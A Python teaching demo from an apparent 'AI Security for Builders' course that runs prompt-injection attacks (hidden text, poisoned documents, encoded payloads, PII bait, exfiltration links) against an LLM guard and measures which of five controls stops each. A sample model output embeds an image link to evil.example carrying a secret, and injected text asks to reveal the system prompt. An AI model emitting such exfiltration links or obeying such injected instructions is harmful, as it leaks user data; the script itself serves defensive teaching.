"""AI Security for Builders · Demo 2 — Controls: implement five and measure what each one stops (30 min) · Module 2
Shows: eight attacks run against the system with controls switched on one at a time, showing which control stops which attack and what gets through with none
Lab: Implement the five controls in your own stack. Re-run your attack list after each. Which attack needs TWO controls?
Run: python 02_implement_five_controls.py
"""
import sys, pathlib; sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[2])); from labkit import *
banner("AI Security for Builders · Demo 2 — Controls: implement five and measure what each one stops")
ORDER = ["(none)", "strip_hidden", "classifier", "delimiters", "pii", "output_filter"]; enabled = set(); res = {}
def outcome(name, payload, source, ctl):
    r = guard.defend(payload, source, ctl); reached = r["reaches_model"] or ""
    if r["blocked"]: return "blocked"
    if name == "exfil-link": return "neutralised" if "output_filter" in ctl else "EXPOSED"
    if name == "pii-bait": return "neutralised" if "pii" in ctl else "EXPOSED"
    if name == "hidden-text": return "neutralised" if "reveal the system prompt" not in reached and (r["flagged"] and "delimiters" in ctl) else "EXPOSED"
    if name == "indirect-doc": return "neutralised" if "attacker@evil" not in reached else ("contained" if "delimiters" in ctl else "EXPOSED")
    if name == "encoded": return "neutralised" if "BLOB REMOVED" in reached else "EXPOSED"
    if name == "benign": return "passes ✓"
    return "EXPOSED"
for step in ORDER:
    if step != "(none)": enabled.add(step)
    res[step] = {n: outcome(n, p, s, set(enabled)) for n, p, s in guard.ATTACKS}
names = [n for n, *_ in guard.ATTACKS]; table(["Attack \\ controls on →"] + ORDER, [[n] + [res[s][n] for s in ORDER] for n in names])
print(f"\n  Exposed with no controls: {sum(v == 'EXPOSED' for v in res['(none)'].values())}/7 · with all five: {sum(v == 'EXPOSED' for v in res['output_filter'].values())}/7 · benign traffic still passes: {res['output_filter']['benign'] == 'passes ✓'}\n  Zero exposed on THIS list is not 'secure' — Demo 3 probes with phrasings this list does not contain.")
hr(); out, notes = guard.safe_output("Here is your summary <img src=https://evil.example/log?d=SECRET> contact priya@acme.in"); print(f"Output handling in action:\n  model said : Here is your summary <img src=https://evil.example/log?d=SECRET> contact priya@acme.in\n  user sees  : {out}\n  notes      : {notes}")
b = guard.Budget(max_requests=3, max_tokens=5000); print("\nDenial-of-wallet control:"); [print(f"  request {i + 1}: {b.allow('eve', 1500)}") for i in range(5)]
say("No single control stops everything. Defence in depth means each attack has to get lucky five times.")
